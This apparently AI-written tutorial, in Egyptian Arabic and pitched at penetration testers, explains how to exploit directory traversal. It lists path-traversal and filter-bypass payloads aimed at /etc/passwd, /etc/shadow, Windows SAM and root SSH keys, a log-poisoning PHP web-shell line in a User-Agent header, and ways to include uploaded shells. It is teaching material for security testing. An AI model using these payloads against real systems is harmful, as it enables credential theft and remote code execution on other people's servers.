تمام، هشرحلك موضوع "Exploiting Directory Traversal Vulnerabilities" بعمق كـ Pentester، مع تركيز على الجانب العملي والأكواد والأوامر، وهحط الخلاصة بالعامية المصرية بعد كل جزء، وبعدين هعدلك كل السيناريوهات الممكنة للاستغلال.

---

### **1. مفهوم Directory Traversal Vulnerabilities بعمق**
"Directory Traversal" أو "Path Traversal" هي ثغرة بتحصل لما تطبيق (زي موقع ويب) بيسمحلك تتحرك خارج المجلد المفروض تكون فيه وتوصل لملفات أو مجلدات تانية على السيرفر. الفكرة إنك بتستغل إنبوت المستخدم (زي اسم ملف أو لينك) عشان تطلع من المكان المحدد وتبص على حاجات المفروض تكون مخفية.

- **ازاي بتحصل؟** لما التطبيق بياخد إنبوت منك (مثلاً اسم ملف عايز تشوفه) ويحطه مباشرة في دالة زي `open()` أو `include()` من غير ما يفحصه أو يحط حدود.
- **الهدف:** الوصول لملفات حساسة (زي `/etc/passwd` في Linux أو `C:\Windows\system32\config\SAM` في Windows).

**مثال بسيط:**
لو موقع بيستخدم كود زي:
```
$file = $_GET['file'];
readfile("/uploads/" . $file);
```
ودخلت في الـ URL: `?file=../../etc/passwd`، السيرفر هيحاول يقرا الملف ده بدل ما يفضل في مجلد `/uploads`.

**خلاصة بالعامية:**  
يعني كأنك في بيت حد وقالك "اقعد في الأوضة دي بس"، بس إنت لقيت طريقة تخرج من الأوضة وتشوف كل حاجة في البيت من غير ما يمنعك.

---

### **2. الجانب العملي: ازاي بنستغل الثغرة دي**
هنشرح الطرق الشائعة مع أمثلة عملية:

#### **أ. الوصول لملفات النظام**
الفكرة هنا إنك بتستخدم الرموز `../` (اللي معناها "ارجع مجلد لورا") عشان تطلع من المجلد الحالي وتوصل لجذر النظام.

- **مثال عملي:**
  لو في موقع بياخد اسم ملف من الـ URL زي:
  ```
  http://target.com/view.php?file=doc.txt
  ```
  جرب تعدل الـ URL كده:
  ```
  http://target.com/view.php?file=../../etc/passwd
  ```
  لو ظهرلك محتوى الملف (زي قايمة المستخدمين في Linux)، يبقى في ثغرة Directory Traversal.

- **أمر عملي كـ Pentester:**
  جرب مسارات زي:
  ```
  ../etc/passwd
  ../../etc/passwd
  ../../../etc/passwd
  ```
  زود عدد الـ `../` لحد ما توصل للملف، لأنك مش عارف المجلد الحالي بعيد قد ايه عن الجذر.

- **لو Windows:**
  جرب:
  ```
  ..\..\Windows\system32\config\SAM
  ..\..\Windows\win.ini
  ```

**خلاصة بالعامية:**  
الموقع لو سابك تكتب اسم الملف اللي عايز تشوفه وما حددش حدود، تقدر تكتبله "طلع برا وهاتلي أي حاجة أنا عايزها" ويجيبهالك.

#### **ب. تجاوز الفلاتر (Bypass Filters)**
كتير من المواقع بتحط فلاتر عشان تمنع الـ `../`، لكن الفلاتر دي ممكن تتخطى.

- **مثال عملي:**
  لو الموقع بيشيل الـ `../` من الإنبوت، جرب تشفير الـ URL (URL Encoding):
  ```
  http://target.com/view.php?file=..%2F..%2Fetc%2Fpasswd
  ```
  (`%2F` يعني `/`).

- **طريقة تانية:**
  استخدم مسارات متكررة أو حروف غريبة:
  ```
  ....//....//etc/passwd
  ..\/..\/etc/passwd
  ```

- **لو بيشيل الـ `../` مرة واحدة بس:**
  جرب:
  ```
  ....//etc/passwd
  ```
  لأن بعد ما يشيل `../` الأولاني، التاني هيفضل ويشتغل.

**خلاصة بالعامية:**  
الموقع لو بيقولك "ممنوع تطلع برا" بس بيفهم نصه كلامك، تقدر تلف عليه وتخليه يديك اللي إنت عايزه بطريقة ملتوية.

#### **ج. Local File Inclusion (LFI)**
لو الموقع بيستخدم الإنبوت في دالة زي `include()` أو `require()`، ممكن تستغل الثغرة عشان تجيب ملفات أو تنفذ كود.

- **مثال عملي:**
  لو URL كده:
  ```
  http://target.com/index.php?page=about.php
  ```
  جرب:
  ```
  http://target.com/index.php?page=../../etc/passwd
  ```
  لو ظهر الملف، يبقى في LFI.

- **استغلال أعمق:**
  لو عارف إن الموقع بيخزن Logs (زي Apache Logs)، جرب تحط كود PHP في الـ User-Agent بتاعك باستخدام Burp Suite:
  ```
  User-Agent: <?php system($_GET['cmd']); ?>
  ```
  وبعدين اطلب اللوج:
  ```
  http://target.com/index.php?page=../../var/log/apache2/access.log
  ```
  لو اللوج ظهر واتنفذ، افتح:
  ```
  http://target.com/index.php?page=../../var/log/apache2/access.log&cmd=whoami
  ```

**خلاصة بالعامية:**  
لو الموقع بيفتح ملفات بناءً على كلامك، ممكن تخليه يفتح حاجة مهمة أو حتى ينفذ حاجة إنت كاتبها في مكان تاني.

#### **د. الدمج مع ثغرات تانية**
لو لقيت Directory Traversal، ممكن تستخدمها مع ثغرات زي Command Injection أو File Upload.

- **مثال عملي:**
  لو رفعت شيل (`shell.php`) على الموقع قبل كده في `/uploads/shell.php`، جرب تجيبه بـ:
  ```
  http://target.com/view.php?file=../../uploads/shell.php
  ```

**خلاصة بالعامية:**  
الموقع لو سابك تتحرك فيه، تقدر تجمع بين حاجات كتير وتعمل شغل كبير بدل ما تبص بس.

---

### **3. سيناريوهات الاستغلال الممكنة كـ Pentester**
دلوقتي هعدلك كل السيناريوهات اللي ممكن تستغل بيها الثغرة دي:

1. **قراءة ملفات حساسة:**
   - `/etc/passwd` أو `/etc/shadow` (للمستخدمين والباسوردات في Linux).
   - `C:\Windows\system32\config\SAM` (للباسوردات في Windows).
   - ملفات الكونفيج (`/var/www/html/config.php`).

2. **Local File Inclusion (LFI):**
   - جلب ملفات الكود (`../../index.php`) عشان تشوف السورس.
   - تنفيذ كود من اللوجز (`../../var/log/apache2/access.log` مع User-Agent خبيث).

3. **Path Traversal مع Command Execution:**
   - لو الملف بيتنفذ، جرب تجيب شيل موجود (`../../uploads/shell.php`).
   - أو نفذ أوامر لو في دالة زي `system()` متضمنة.

4. **Bypass Authentication:**
   - لو الموقع بيعتمد على ملفات معينة للتحقق، جرب تجيبها أو تعدلها:
   ```
   ../../admin/config.php
   ```

5. **Data Exfiltration:**
   - جلب قواعد بيانات (`../../var/www/html/db_backup.sql`).
   - سرقة مفاتيح SSH (`../../root/.ssh/id_rsa`).

6. **Denial of Service (DoS):**
   - لو الموقع بيسمح بقراءة ملفات كبيرة جدًا (`../../dev/random`)، ممكن تعلقه.

7. **Privilege Escalation:**
   - لو وصلت لملفات بتصريح عالي (`/etc/shadow`)، ممكن تكمل استغلال يدوي.

---

### **نصيحة كـ Pentester:**
- استخدم **Burp Suite** عشان تجرب مسارات مختلفة وتشوف الردود.
- جرب تشفير الـ URL أو تضاعف الرموز لو لقيت فلاتر.
- ابحث عن ملفات شائعة (زي `config.php` أو `web.config`) بناءً على نوع السيرفر (Apache, IIS).
- لو لقيت LFI، دايمًا فكر في اللوجز أو ملفات مؤقتة كطريقة للتنفيذ.

لو عايز تفاصيل أكتر عن أي سيناريو أو أداة، قوللي!